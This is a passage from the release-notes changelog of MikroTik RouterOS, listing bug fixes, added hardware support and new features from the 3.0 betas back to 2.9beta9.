*) fix virtual-AP default mac address;
*) fixed Atheros receive stalling bug that could be observed while
   snooping and frequency-monitoring;
*) fixed interface disappear issue on bridge port disabling/removing;
*) fixed station-pseudobridge to not use local macaddress as
   default for translation;
*) made ip firewall not be used for bridged packets by default;

What's new in v3.0beta3:

*) added Event-Timestamp radius attribute in hotspot Accounting messages;
*) added hits counter to hotspot walled-garden rules;
*) made demo mode work;
*) fixed bug - sometimes installation software was reporting errors were no error existed;
*) console - fixed local variables;
*) console - improved syntax error messages;
*) console - allow use of item numbers in scripts and without prior print;
*) console - order export by object type dependencies, use item numbers
     where required;
*) fixed AR5211 channel list bug;

What's new in v3.0beta2:

*) added support for Atheros PCI Express;
*) replaced console parser -
     colored syntactic feedback,
     line and column of parse error,
     export coloring,
     substitution inside quoted strings
       (e.g. "addr $($addr & 255.255.255.0)/24");
*) line editor remembers last modified string when walking history. You don't
     lose your command if accidently press 'up';
*) F1 works as '?' in console;
*) references to one script may become '(unknown)', will require manual
     fixing of configuration;
*) fixed behavior of 'do=' arguments in console;
*) fixed - executing lines from console history did not reset history
     position;
*) hotspot transparent http proxy requests now go through acl list of proxy;
*) autosupout.rif & supout.rif file generation now works;
*) wireless - added disable-csma option for nstreme mode;
*) wireless - added station-pseudobridge modes to do MAC NAT when
   bridging over station mode link;
*) wireless - support for WPA2 pairwise master key caching to speed
   up re-connect times;
*) wireless - access-list and connect-list can now specify signal
   range to allow for connection;
*) wireless - access-list is now ordered and supports matching of 
   all interfaces, all addresses;
*) wireless - access-list entry can match in specified time;
*) wireless - access-list can specify client specific WPA or WPA2
   pre-shared-key;
*) wireless - support for RADIUS accounting for both MAC and EAP;
*) wireless - support for RADIUS Disconnect-Request to disconnect
   client with RADIUS request;
*) wireless - can now specify format of MAC address in RADIUS
   requests;
*) wireless - include Calling-Station-Id (in format XX-XX-XX-XX-XX-XX)
   and Called-Station-Id (in format XX-XX-XX-XX-XX-XX:ssid) in RADIUS
   requests;

What's new in v3.0beta1:

*) added support for SATA disks;
*) added initial support for SMP on x86;
*) added support for up to 2Gb of memory on x86;
*) fixed time matching in firewall rules;
*) added time matching to bridge firewall rules;
*) multiple ports can be specified in firewall as src. and dst.;
*) added support for NAT-T in IPsec;

Caveats:

*) dropped support for Linksys HomeLink PhoneLine Network Card (10Mbps over 
   telephone line);
*) dropped support for PCMCIA RadioLan;
*) dropped support for Wavelan/Orinoco wireless cards;
*) dropped support for Aironet/Cisco wireless cards;
*) dropped support for Atheros 5210 wireless cards;
*) dropped support for telephony package;
*) ISDN does not log called and caller numbers anymore;
*) replaced console parser -
     some of previously accepted syntax now will not work,
     syntax can change in next betas,
     completion is not yet fully implemented;
*) matching for some RFC non conforming TOS values won't work;


What's new in 2.9.51:

*) graphing - fixed bug;
*) fixed bug - user manager database in-use counter was wrong
     for database size over 21 MB;
*) fixed p2p - bandwidth shaping on ARES P2P traffic was not working properly;
*) fixed bug - dhcp server failed to give out options with code > 127;
*) fixed bug - r8169 could crash the router after some time;
*) graphing - bugfixes; health section restored;
*) user manager - fixed security bug in user page;
*) user manager - fixed ampersand bug;
*) user manager - fixed bug related to download/upload counter overflow 
    in reports;

What's new in 2.9.50:

*) nand improvement for RB532A;

What's new in 2.9.49:

*) nand improvement for RB532A;
*) user manager - fixed bug with accounting creating too many sessions;

What's new in 2.9.48:

*) fixed vlan on bridge - some firewall features did not work;
*) improved warez/ares p2p protocol matching
*) fixed memory leak in ospf that is triggered by adding/removing a lot of
     dynamic interfaces;
*) fixed bug in routing-test package;
*) updated timezone information;
*) user manager - fixed bug for credit extension using PayPal payments;

What's new in 2.9.47:

*) make external-fdb for station-wds interfaces be disabled when
   in auto mode;

What's new in 2.9.46:

*) added support for Broadcom BCM4401 (B0 & B1);

What's new in 2.9.45:

*) routing-test -
     fixed memory leak;
     inside confederations ignore routes with our AS number in AS path,
       this fixes looping of routing information inside confederation;
*) calea server supports limited intercept;
*) mac address changing did not work for RB44G (realtek 8169 chip);
*) fixed bug - could not set new-tos in mangle rules from console;
*) realtek 8169 ethernet chip (rb44g) could stop when using vlans
*) user manager - fixed bug for PayPal payments with user data containing
   specific characters;
*) implement hw-retries setting for wireless;

What's new in 2.9.44:

*) fixed support for MTB-134 / Portwell EZIO LCD display;
*) fixed bug - user-manager did not send upload/download limit gigawords
     to hotspot server (value was limited to 4.2 GB);
*) fixed bug - hotspot login could fail with "failed to grant access" 
     under some specific configurations;
*) routing-test - fixed bug introduced in 2.9.43. connected routes could show
     wrong interface;
*) routing-test - fixed multipath route displaying
    (only one address were displayed for all nexthops);
*) fixed bug - DHCP server did not parse Relay-Agent-Info option 82;
*) fixed PSD matcher in firewall;
*) made Torch to not exlcude non TCP & UDP traffic if no specific port was provided;
*) fixed bug - telephony could crash on incoming ISDN call;
*) fixed bug in ospf - nbma network sometimes lost all ospf routes after
     peer flap;
*) PPP will use private address automaticly if remote end has not provided one;
*) added initial calea support
*) user manager - 3-byte char (UTF-8) bugfix;

What's new in 2.9.43:

*) routing-test - changes that are aimed at increasing perfomance and
     reducing memory usage:
     limit number of outstanding bgp updates, sending feeds to many peers
       uses bounded amount of memory;
*) fixed bug - telephony was crashing whenever voice-port was changed;
*) ups - fixed: program was becoming unresponsive when serial ups was
     configured but was not connected;
*) support for full frequency list of Atheros chips;
*) user manager - password not revealed on sign-up;

What's new in 2.9.42:

*) fixed RouterOS configuration to reset when "Soft Reset" jumper on
   RB133C or JP1 on RB532r5 is shorted;
*) webproxy-test - fixed FTP protocol detection;
*) routing-test - fixed bgp crash;
*) fixed wireless sniffer file format;
*) work around bugs in some WPA2 implementations that do not do
   proper group key updates;

What's new in 2.9.41:

*) routing-test - fixed bugs introduced in 2.9.40:
     bgp routes were not removed;
     was possible to enter busy-loop;
*) fixed RADIUS rate attribute processing in wireless;
*) fixed RSTP protocol version number;
*) certificates - sometimes when importing CA certificate, certificate
     cache was reset. Fixed;
*) graphing - incorrect scale legend bugfix for large data amounts;
*) improved support for realtek 8169 chip (routerboard 44G)
*) user manager - added PayPal payment system;
*) user manager - voucher customization bugfix;
*) user manager - user signup bugfix;

What's new in 2.9.40:

*) ups - fixed resource leak;
*) sped up packet handling when router had a lot of queues;
*) fixed RIP redistribution after an interface down/up (routing-test);
*) fixed in console - print count-only in scripts was crashing console;
*) updated WinBox Loader to v2.2.11;
*) fixed Atheros 5211 channel lists;
*) console - fixed export to escape '?' with '\' in strings;
*) routing-test - improved BGP reload time and memory usage on peer down/up;
*) routing-test - fixed very rare crash, small performance improvement;
*) graphing bugfix - some interface (bridge, wlan) data was dropped on reboot;
*) user manager - voucher customization;
*) user manager - added database save/load/reset actions (from console only);
*) user manager - added Authorize.Net payment system;
*) user manager - prices now stored as decimals;
*) user manager - increased active session count limit for license levels 4 and 5;
*) user manager - object removal confirmation;
*) user manager - CSV files now have header;
*) user manager - popup-blocker workaround for CSV;
*) user manager - close option for active sessions;
*) user manager - reset-counters option for routers;
*) user manager - public-host field for customers;
*) user manager - group field for users;
*) user manager - fixed time-zone bug;

What's new in 2.9.39:

*) fixed scheduler to notice clock changes;
*) fix for miniRouter ethernet tx stop;
*) improved performance of user-manager;
*) some fixes in USB UPS report handling;
*) fixed line power monitor to also work with USB UPS;
*) added workaround for WinBox freeze under latest Wine;
*) added support for Huawei Mobile Connect Model E620 (3G);
*) added support for Novatel Merlin S720 (HSDPA);
*) fixed encrypted link establishment when using nstreme;

What's new in 2.9.38:

*) fixed unnecessary BGP update sending (when BGP networks were configured);
*) fixed rb100 ethernet driver;
*) fixed hotspot not to allow login at all if WISPr-Session-Terminate-Time
   is in past (previously 1s uptime was allowed in this case);
*) console now accepts hexadecimal numbers in more places, fixes bridge
     filter mac-protocol import;

What's new in 2.9.37:

*) fixed rb100 ethernet driver;
*) fixed mkdir to work for Windows XP FTP client;

What's new in 2.9.36:

*) added GIS/WISPr xml pages for hotspot smart client support;
*) fixed possible routing program crash when using check-gateway;
*) DNS update tool now before updating always deletes any existing DNS 
    records with the same name;
*) added Event-Timestamp radius attribute in hotspot Accounting messages;
*) realtek 8169 could temporarily be unable to receive packets;
*) fixed bug - PPPoE, PPTP and L2TP server could stop authenticating new users after
   RADIUS request timeout;
*) user manager - fixed bug related to IE7 innovations;
*) fixed rb100 ethernet driver;

What's new in 2.9.35:

*) fixed OSPF daemon configuration - in some case it did not receive
   router id and list of interfaces;
*) fixed bug - after configuration change or startup scheduler was delaying
    execution of items for 0.5 .. 1.5 times the interval;
*) fixed bug - PPPoE server could lose current state when many clients
    are connecting at the same time and when RADIUS server is very slow;
*) fixed possible ethernet lockups on RouterBorad 153
*) user manager - added support for MS-CHAPv1 & MS-CHAPv2 authentication and encryption
   key generation, now user manager can authenticate PPTP server clients;

What's new in 2.9.34:

*) hardware watchdog for RouterBoard 100 series;
*) fixed bug - DHCP server did not work on wireless interfaces
   (bug introduced in 2.9.33);
*) user manager - renamed 'username' field to 'name' under users for 
   compatibility with hotspot and ppp user export file;
*) fixed bug - PPPoE, PPTP and L2TP server could stop working properly if
   RADIUS authentication is used and RADIUS server is slow on responding;

What's new in 2.9.33:

*) fixed bug - dhcp client could use empty MAC address on vlan over wlan 
   interface;
*) added support for Option G3 PCMCIA card (Vodafone UMTS);
*) fixed bug - PPPoE server could lock up after reboot if many clients
   were connecting at a same time;
*) fixed bug - sometimes ghost ppp users appeared, users have disconnected long ago,
   but system still listed them as active;
*) user manager - increased field maxlength in web;
*) user manager - fixed csv generation bug (introduced in 2.9.32);

What's new in 2.9.32:

*) fixed bug in PPPoE, PPTP and L2TP - rate limiting queue addition failed sometimes;
*) fixed bug in PPPoE, PPTP and L2TP - after reboot 100s of users reconnecting can make
   some connections non working;
*) fixed bug in PPPoE, PPTP and L2TP - some logged out users could still be shown in active
   ppp users lists, disallowing re-login if only-one is set;
*) speed up WinBox secure mode data transfer rate 2.5 times;
*) notice clock changes made by NTP and adjust GMT offset accordingly;
*) console command "system reset" has been renamed to "system reset-configuration";
*) user manager - improved object removal performance;
*) user manager - added session and log removal;
*) user manager - user page now requires customer's public-id;
*) user manager - fixed logout crash bug;
*) user manager - fixed order of dirs in export;

What's new in 2.9.31:

*) allowed Radius server to change MAC address for DHCP server lease;
*) fixed bug - DHCP server did not parse Relay-Agent-Info option 82 correctly;
*) added support for Subversion to web-proxy;
*) added missing stuff to OSPF in WinBox;
*) added support for Xmit-Limit-Gigawords & Recv-Limit-Gigawords to PPP, PPPoE, PPTP, L2TP;
*) fixed ghost PPPoE, PPTP, L2TP interfaces - users with the same name
   could not login, if such invisible interface existed;
*) fixed route filters in routing-test;
*) fixed bridge mac address issues - affects hotspot on bridge
   interfaces;
*) user manager - popout table option toolbar;
*) user manager - draggable windows;
*) user manager - improved unlimited user reports;
*) user manager - correct table refresh on user extend;
*) user manager - search field for tables;
*) user manager - fixed active session limit to work correctly;
*) user manager - fixed cookie bug for Opera browser;
*) user manager - user signup page;

What's new in 2.9.30:

*) improved webproxy-test performance;
*) fixed support for some Novatel U740 (Wireless HSDPA Modem);
*) added support for D-Link DGE-530T;
*) fixed MS-DNS-Server & MS-WINS-Server address retrieval from RADIUS
   for ppps;
*) RADIUS provided Interim-Update takes precedence over user configured one;
*) fixed bug - when upgrading from v2.8.x only system package got upgraded;
*) user manager - logging config for routers;
*) user manager - multi-object actions affect only objects on active page;
*) user manager - popout menu;
*) user manager - multi-page object selection improvements;

What's new in 2.9.29:

*) fixed webproxy-test cache expiration when only disk cache is used;
*) speed up downloading large files from cache (webproxy-test);
*) fixed a memory leak in routing-test;
*) fixed BGP attributes for static routes in routing-test;
*) user manager - user counter reset
*) user manager - CSV files for user print-pages
*) user manager - fixed web-session timeout bug
*) user manager - fixed permission bugs for user-batch-add
*) user manager - using customer specific date format on web pages

What's new in 2.9.28:

*) fixed bug - user-manager could crash on RB100 and RB500;
*) fixed bug - hotspot could crash (introduced in 2.9.27);
*) fixed bug - sometimes hotspot login could fail with failure to add queue;
*) fixed bug - file-system cache on RB100 and RB500 was not flushed on reboot
   (sometimes "Keep old configuration" on netinstall did corrupt 
    configuration data);
*) fixed bug - PPP, PPPoE, PPTP and L2TP could not authenticate via MS-CHAPv1 with some 
   passwords;
*) fixed bug - PPP, PPPoE, PPTP and L2TP on lost carrier did not correctly report disconnect 
   cause;
*) added support for Broadcom 5753, 5789 and 5704S2 LAN chips;
*) added support for Novatel U730 (Wireless HSDPA Modem);
*) fixed route redistribution with more than one BGP peer (routing-test);
*) fixed bug - sometimes not all routes were removed after BGP peers went down;
*) fixed some crashes in routing-test;
*) added "blackhole" routes (routing-test);
*) added named time zone support;
*) added 'reset-mac' command for ethernet interfaces;
*) fixed min-runtime and on-line for APC USB UPS;
*) added support for Recv-Limit-Gigawords and Xmit-Limit-Gigawords 
   Radius attributes for hotspot;
*) added options for contolling nexthop selection in BGP updates;
*) user manager - added log section to web interface
*) user manager - result message for enable/disable operations improved
*) user manager - added reports for single user
*) user manager - GUI improvements
*) user manager - page for users (statistics, settings)
*) user manager - reports for unlimited users

What's new in 2.9.27:

*) added WISPr Radius attribute support to hotspot;
*) fixed booter setting damaging on MIPS based routerboards,
   bug was introduced in 2.9.18;
*) fixed hotspot to handle lost DHCP leases in a more graceful way;
*) changed serial terminal prefix key to Ctrl-A;
*) fixed special-login;
*) fixed Interface column in WinBox VRRP Table;
*) fixed BGP connection establishment when router ID is not explicitly set;
*) changed webproxy-test logging topics from "webproxy,info" to 
   "webproxy,account";
*) ppp client acquires serial port only when dialing in, not immediately;
*) improved vrrp gratuitous arp sending, fixed vrrp enable/disable bug
*) added support for Novatel U740 (Wireless HSDPA Modem);
*) fixed NTLM authentication in webproxy-test;
*) fixed default route distribution in OSPF;
*) fixed graphing bug related to periodic hard disk writes;
*) user manager - user report bugfix
*) user manager - active user sorting bugfix
*) user manager - data table header improved
*) user manager - uptime-limit & rate-limit improvements
*) user manager - javascript popup transparency bugfix for IE

What's new in 2.9.26:

*) removed support for MMS connection tracking - it did not work as it should;
*) fixed unsetting of ppp secret local and remote addresses;
*) added ping option to ppp active sessions in WinBox;
*) added total statistics for Torch in WinBox;
*) fixed problem with static ARP entries not added after reboot
   on the bridge interface;
*) dns cache max tll setting did not apply to negative records;
*) fixed some memory leaks in dns cache;
*) fixed BGP bugs in routing-test;
*) fixed RIP bugs in routing-test;
*) fixed bug - some stale PPPoE, PPTP and L2TP dynamic interfaces were not removed;
*) added logging of ups events;
*) added support for more then 2 USB serial ports;
*) fixed to save system logging echo messages every 30s and not immediately;
*) fixed scrolling in WinBox;
*) fixed bug - command output executed directly through ssh sometimes got 
   trimmed;
*) user manager - customer page added
*) user manager - active session page added
*) user manager - report performace improved
*) user manager - GUI improved

What's new in 2.9.25:

*) added missing '/ip dhcp-server alert get' command;
*) fixed DHCP server to work with some non-RFC compliant DHCP clients;
*) improved robustness of serial port UPS handling; fixed value exponent
   handling for USB UPS;
*) fixed problem with static ARP entries not added after reboot
   on some interfaces;
*) graphing web interface is now a valid xhtml 1.0;
*) added support for Novatel Wireless CDMA card;
*) speed up route table updates in routing-test;
*) fixed crash in routing-test (introduced in 2.9.19);
*) fixed crash in user-manager if download-limit is used and radius packet 
   logging is enabled;
*) fixed handling of disabled packages by console setup;

What's new in 2.9.24:

*) fixed console crashes on rb500, that were produced by many
   scheduler entries;
*) added option to WinBox to not automatically open previous session windows
   works only with v2.9.24;
*) improved vrrp (fixed some bugs, added interface setting to addresses);
*) fixed crashing while tracking PPTP connections for NAT;
*) fixed rb500 ether1 - did not restore speed/duplex settings after reboot,
   disable,enable was needed;
*) bandwidth-test could crash router with packet sizes < 32;
*) fixed link-monitor=arp when bonding used on WDS interfaces;
*) made roaming handling in AP more liberal to support different
   interpretations of 802.11 (for Siemens WL2);
*) fixed memory leak in graphing;

What's new in 2.9.23:

*) fixed bug - Intel Gigabit ethernet cards did not report current traffic rate 
   correctly;
*) improved rb500 ether1 interface stability
*) fixed graphing bug - statistics' values of cpu graphs

What's new in 2.9.22:

*) show detected http-proxy for hotspot hosts;
*) fixed webproxy-test to detect http-proxy for hotspot hosts
   (broken in 2.9.12);
*) fixed MAC address changing in Ethernet like interfaces;

What's new in 2.9.21:

*) added "/system show-license" command;
*) fixed hotspot to work on RB112;
*) fixed memory leak in IPSec ISAKMP;
*) fixed WinBox "Set BGP Prepend" option in routing-test;
*) updated Intel E1000 driver and added support for
   latest Intel Gigabit ehternet cards;
*) fixed bug - rb500 had problems with ether1 interface

What's new in 2.9.20:

*) fixed write-sect-total for RB500;
*) added limit of simultaneous hotspot mac logins to 1 for each MAC address;
*) made LCD displaying more stable;
*) added WinBox support for routing-test package;
*) fixed PPTP client to not disconnect every 30s on some occasions;
*) fixed bug - interface and queue graphs got lost on reboot (introduced in 2.9.19)
*) fixed bug - hotspot walled-garden did not work (broken in 2.9.19);

What's new in 2.9.19:

*) fixed BGP memory leak in routing package;
*) implemented write-sect-total for RB500;
*) added feature to access hotspot servlet pages by suffix ".cgi";
*) fixed bug in sniffer;
*) changed simple queues to work better together with pppoe;
*) added WinBox support in webproxy-test package;
*) PPTP client now uses PPTP TCP keepalives too;
*) changed hotspot not to detect new hosts from broadcast requests;
*) added hooks before hotspot dynamic firewall rules for custom modifications;
*) added NSSA support for OSPF;

What's new in 2.9.18:

*) fixed bug - dhcp server, dhcp client and hotspot could show up as
   invalid in case of many (> 10) vlan interfaces;
*) added back ospf logs, they were removed since 2.9.13;
*) fixed vrrp mac address restoring after reboot;
*) upgraded SysKonnect SK-98xx/SK-95xx Gigabit Ethernet driver;
*) inceased the speed of CDMA modems;
*) fixed netwatch missing ping replies;
*) added ability to reset counters for single queue;
*) fixed bug - PPTP server started to use 100% CPU after NMAPing it;
*) changed behaviour of scheduler entries that have start-time=startup:
   use router uptime instead of clock time,
   if interval is not 0, then do not run that entry immedeately after startup;
*) added radius-default-domain setting for hotspot server profile;
	
What's new in 2.9.17:

*) fixed TCP SYN connection tracking timeouts;

What's new in 2.9.16:

*) fixed ospf bugs that caused problems when multiple addresses were
     assigned to the same interface;
*) added option for enabling TCP SYN cookies;

What's new in 2.9.15:

*) fixed mac address changing (improves vrrp)
*) fixed dns cache, it could stop working
*) added server-name and interface-name variables in hotspot servlet pages;
*) fixed bonding, works better with wds slaves
*) fixed wireless related kernel crashes when some combinations of
   nstreme/framer-policy/encryption are used;
*) added support for VerizonWireless CDMA modem;
*) fixed major bug in routing protocol operation that was
     introduced in 2.9.13;
*) decreased default queue size for Simple Queues (uses less memory);
*) fixed bug - system backup did not work on RB500
               (introduced in 2.9.14);
*) fixed bug - RB500 with 64MB NAND could loose all free space
               (introduced in 2.9.14);
*) disabling connection tracking could sometimes crash router;

What's new in 2.9.14:

*) fixed upgrade from version 2.8 to keep correct order in web-proxy 
   rule lists and radius server list;
*) ping shows more types of ICMP reply messages, including
   destination unreachable;
*) fixed some ethernet card autonegotiation/speed/duplex settings;
*) RB500 ether1 interface has mdix-enable feature (enabled by default)
*) fixed bgp in routing package, did not work in previous version;
*) fixed amount of free-hdd-space on RB500;

What's new in 2.9.13:

*) added support for SSH DSA keys;
*) fixed bug - nstreme link with framer-policy=dynamic-size was not
   taking into account framer-limit;
*) fixed bug - RADIUS disconnect request did not work;
*) fixed problem - PPPoE server had too aggressive initial timeouts, and 
   some clients could not connect;
*) improved WPA link establishment for WDS;
*) fixed problem - interface graphs got lost on reboots;

What's new in 2.9.12:

*) fixed WPA2 when WDS link security profile is other than for interface;
*) do not warn about ssh client automatic tries with empty password if successful
   login follows;
*) fixed problem - PPPoE, PPTP and L2TP could loose all connections in some rare cases;
*) added multi-homing support to PPTP server;
*) fixed problem - sometimes WinBox window disappeared when snooping on 
   wireless interface;
*) fixed problem - WinBox did not show signal strength in wireless 
   snooper;
*) fixed bug - traffic monitoring on bridge interfaces did not work;
*) added authoritative=after-2sec-delay default option for dhcp server;
*) fixed bug - mac-ping could fail on bridge interface;

What's new in 2.9.11:

*) added hotspot active users list to snmp;
*) fixed OSPF in routing-test package;
*) added complementary Hotspot feature (trial user support);
*) added priority and min-rate fields in rate-limit attribute for
   Hotspot, PPP and DHCP;
*) reverted replay window size change that introduced problems
     with IPSec in 2.9.9;
*) updated RTL8169 driver;
*) added ability to enable & disable installed packages;
*) test packages included in big upgrade package - each requires enabling to use;
*) fixed bug - hotspot server did not handle correctly disabling of 
   bridge interface;
*) fixed tx-power selection for SR2 cards in wireless-test;

What's new in 2.9.10:

*) fixed problem - bridge configuration was not kept on upgrade on RB500;
*) fixed problem - PPPoE server did not work on bridge interface sometimes;

What's new in 2.9.9:

*) removed write-sect display from RB500 version. it is not supported on
   this version and was showing zeros;
*) changed bridge configuration approach;
*) improved handling of arbitrary characters in console completions;
*) fixed check-gateway in routing-test;
*) improved Simple Queues in WinBox;
*) allowed bypassed hotspot hosts to talk directly with each other even 
   if address-pool is set for hotspot server;

What's new in 2.9.8:

*) added support for Verizon Express Network PC5220 (AirPrime 5220);
*) increased connection tracking table size;
*) fixed after reboot disappearing WDS interface issue;
*) added 5/10MHz Atheros channel support to wireless-test.npk package (must 
   be installed separately);
*) added WPA2 (Personal&Enterprise) support to wireless-test.npk package (must 
   be installed separately);

What's new in 2.9.7:

*) fixed bug - web server could crash sometimes (introduced in 2.9.6);
*) fixed traceroute time display;
*) added route rule configuration;
*) fixed performance problem with universal client on RB500;
*) improved dynamic wireless rate selection;
*) updated WPA to work with Netgear WGE111;
*) added hotspot ip-binding changes to take effect immediately;
*) fixed M3P;
*) fixed queue time limits;
*) added direction matcher to simple qeueues;
*) fixed problems with graphs;

What's new in 2.9.6:

*) added ":nothing" command to console, and made void return values of
   console commands behave as "false";
*) fixed bug that was triggered by multiple routes with same destination
   and different routing-marks;
*) fixed default ppp profile export;
*) added non passthrough option to mangle rule mark actions;
*) added daylight savings time configuration;
*) fixed bug - dhcp server could stop responding, if address-pool is empty
               and next-pool is used;
*) added ip scanner;
*) fixed bug - USB modems did not get recognized;
*) fixed memory leak in dns cache;
*) made wireless station to take into account local compression setting;
*) REMOVED SETUP OF ADDITIONAL FEATURES FOR Prism CARDS TO AVOID
   DISCONNECTION PROBLEMS;

What's new in 2.9.5:

*) fixed bug - sometimes active user sessions were forgotten;
*) fixed bug - data storing in graphing, it was always on storing;
*) fixed bug - TKIP encryption was misbehaving over poor links and
               under load;
*) fixed web-proxy to show client-ip even if it goes through hotspot proxy;
*) fixed bug - https login for hotspot did not work, if parent-proxy was set
   for /ip proxy;
*) fixed Prism disconnect issue;

What's new in 2.9.4:

*) fixed WinBox configuration problems;
*) added multiple ip address support for dns-update;

What's new in 2.9.3:

*) fixed bug - hotspot https login could crash web server;
*) added fragmented packet matcher in firewall;
*) last critical logs get displayed on login in console and telnet;
*) changed wireless response on link loss;

What's new in 2.9.2:

*) removed "/system scheduler move" command;
*) added "start-time=startup" option for scheduler items;
*) updated PPTP connection tracking driver;
*) fixed wireless registration handling on radar detect event;
*) fixed multiple file uploading in WinBox;
*) improved performance of bridging over WDS when neighbor discovery is
   enabled;
*) fixed hotspot to log RADIUS accounting Start and Update request 
   timeouts as warnings and not errors;
*) fixed problems with PAP authentication in PPP, PPPoE, PPTP and L2TP;
*) fixed GPS;
*) fixed hotspot www servlet to use smaller amount of memory;
*) updated Prism disconnecting to improve reconnect time;
*) fixed Prism STA scanlist handling;
*) improved handling of PPPoE, PPTP and L2TP sessions;
*) added missing server field in hotspot active user list;
*) fixed bug - hotspot did not allow access to its routed hosts from 
   outside even when address-pool=none;
*) fixed bug - DHCP server could hang under heavy load;
*) fixed bug - hotspot limited addresses-per-mac even if address-pool=none;
*) removed preamble-mode=both for Prism cards;
*) fix WDS statistics counters;

What's new in 2.9.1:

*) fixed memory leak in torch tool;
*) fixed routing filter set-nexthop - was always setting to 0.0.0.1;
*) added VLAN support to tulip ethernet chips;
*) sped up IPsec AES decryption on RB500; 
*) not running discovery protocol on interfaces that are in bridge
*) fixed bug - dial-on-demand interfaces did not remove dynamic addresses
   sometimes;
*) fixed console bug - was crashing on scheduler scripts
*) fixed bug - DHCP server forgot dynamic BOOTP leases after reboot;
*) fixed atheros lock up under specific situations;

What's new in 2.9:

*) fixed bug - hotspot could crash if radius authorization is used;
*) fixed WPA with AES encryption sometimes not working;
*) fixed nstreme with compression;
*) fixed multiple PVC issues;
*) updated Czech Republic regulatory domain info;
*) fixed WPA for virtual-APs;

What's new in 2.9rc10:

*) added support for Atheros hardware compression;
*) fixed bug - dhcp-relay on wireless interface dissapeared after reboot;
*) fixed bug - hotspot could crash if addresses-per-mac limit is exceeded;
*) fixed Prism WDS bug;
*) fixed bug - webbox timeouted user removing;

What's new in 2.9rc9:

*) added support for BCM5721 Gig-E cards;
*) improved wireless frame handling;
*) fixed wireless WPA with WinXP;
*) fixed wireless wds-slave bug;
*) lot of other wireless bugs fixed;
*) fixed bug - AES group key handshake failed;

What's new in 2.9rc8:

*) fixed format-drive and check-drive to work in web-proxy;
*) added support for NTP servers in DHCP;
*) fixed dhcp-server to accept DHCPREQUEST while lease is in waiting state;
*) added deauth sending when AP decides that link is lost due to
   inactivity or extensive data loss;
*) fixed bug - fixed routing memory leak when adding and removing
   interfaces;
*) fixed bug - web-proxy access list did not handle src-address and 
   dst-address correctly;
*) updated wireless regulatory domain info;

What's new in 2.9rc7:

*) fixed bug - wireless scan sometimes did not work;
*) fixed bug - wireless security-profile changes did not reset affected
   interfaces;
*) fixed bug - Ethernet ports & miniPCI slots on daughterboard was locking up;
*) fixed bug - some ppp users where not removed from active list on lossy links;
*) removed replay checking when AES-CCM or TKIP used with static keys;
*) added back rip and ospf to routing-test package;
*) fixed nstreme2 transmit power setup;
*) fixed wild card url in web-proxy access list to be a substring;
*) fixed bug - web-proxy access list entries were not used in correct order;
*) added default web-proxy access rule to block dst-port=23-25;
*) added direct access list for built-in http proxy;
*) added support for multiple HTTP page sets for the same hotspot server;
*) fixed bug - hotspot sent only 1st RADIUS Class attribute in 
   accounting packets;
*) added option to select Nas-Port-Type value for hotspot RADIUS;
*) improved hotspot not to account idle-timeout as part of session time;
*) added ability to bypass whole ip subnet in hotspot;
*) improved upload/download speed of files to/from WinBox;
*) fixed bug - WinBox loader from v2.8 did not work well with v2.9;
*) fixed bug - PPPoE/PPTP/L2TP ignored profile rate-limit when authenticating over RADIUS;
*) fixed bugs with IPsec that made active policies invalid;

What's new in 2.9rc6:

*) fixed wireless disconnect reason logging;
*) fixed bug - console import did not work, reported "no such command or directory";
*) fixed bug - WinBox could crash when opening list window with sorting by 
   statistics;
*) fixed bug - WinBox could show really big numbers improperly;
*) improved address list performance
*) fixed bug - modifying queue tree nodes for which parent interface has been
   removed could make router unusable
*) fixed bug - firewall src/dst port matcher was applied on packets even if it
   was 'unset' or disabled by winbox
*) fixed bug - http proxy could not open ask.co.uk offered links;
*) fixed bug - static arp entries were lost after reboot for bridges and wlans


What's new in 2.9rc5:

*) fixed nstreme framing behaviour if framer-policy=exact-size, removed
   unnecessary frame padding;
*) added support for 0 and less tx-power for wireless;
*) fixed 100% CPU usage with wireless package without appropriate license;
*) fixed prefsrc of static routes, was used in reverse order;
*) added support for SR2 Atheros cards;
*) fixed bug - IP pool address were not released if dynamic PPPoE, PPTP & L2TP 
   interface got removed manually;
*) fixed bug - empty passwords in PAP RADIUS authentication were not sent in 
   compliance to RFC;

What's new in 2.9rc4:

*) fixed via driver for RB500;

What's new in 2.9rc3:

*) fixed radius-mac-authentication bug in wireless;

What's new in 2.9rc2:

*) added next-pool feature to ip pools;
*) fixed virtual AP client registration;
*) limited responding to unauthorized data frames in wireless;
*) added temporary blocking of misbehaving wireless clients that periodically
   attempt, but fail to connect or authenticate;
*) WDS links now can run with different security-profile;
*) added WPA-PSK support for WDS links;
*) fixed bug - PPPoE, PPTP, L2TP servers were slower than needed in accepting
   hundreds of connections;
*) fixed bug - Winbox crashed on opening wireless sniffer packet window;

What's new in 2.9rc1:

*) fixed bug - asynchronous PPP did not work after reboot;
*) fixed bug - via ethernet could lock up on too big packets (more than 1500);
*) fixed bug - hotspot ran out of memory after a while;

What's new in 2.9beta19:

*) added advertisement support to hotspot;
*) made prism cards working on RB500;
*) added PPP packet logging in debug mode;

What's new in 2.9beta18:

*) small bugs fixed;

What's new in 2.9beta17:

*) added rogue dhcp server finder;
*) added support for custom options in DHCP server;
*) added connect-list for wireless stations to have priorities for APs;
*) added area string and area string matching in connect-list for wireless;
*) changed WDS links to check against connect-list, not access-list;

What's new in 2.9beta16:

*) fixed nstreme speed problems;
*) added wireless security profiles framework;
*) added initial WPA-PSK version;
*) more bugs fixed;

What's new in v2.9beta15:

*) fixed in ipsec - installed-sa print reported timeout when no policies were
   configured;
*) fixed in ipsec - when policies were configured to use manual-sa, ipsec did
   not work after reboot;
*) improved web based configuration;
*) fixed snmp interface counters;
*) added setup to Hotspot;
*) more bugs fixed;

What's new in v2.9beta14:

*) added wireless sniffer & snooper;
*) added web based configuration;
*) memory leak fixed;
*) more bugs fixed;

What's new in v2.9beta13:

*) fixed Atheros station to connect to hidden-ssid networks;
*) added delay threshold for dhcp server and dhcp relay;
*) added SNMP IF-MIB::ifOperStatus entity to mirror running flag of
   interface;
*) minor bugs fixed;

What's new in v2.9beta12:

*) Virtual AP have their own MAC addresses;
*) WDS support on Virtual AP;
*) added support for wireless short preamble;
*) added new HotSpot;

What's new in v2.9beta11:

*) fixed - National Semiconductor 100Mbit ethernet driver could not receive
   packets;
*) minor bugs fixed;

What's new in v2.9beta10:

*) fixed - connection tracking did not work as expected;
*) fixed - ethernet interface bonding did not work;
*) added - workaround in transparent web proxy for IE6 access to Hotmail;
*) bugfixes;

What's new in v2.9beta9:

*) simple queues now have all the features of queue tree (and more);
*) added address-lists to firewall;
*) isakmp does not listen on udp port 500 while ipsec is not configured;
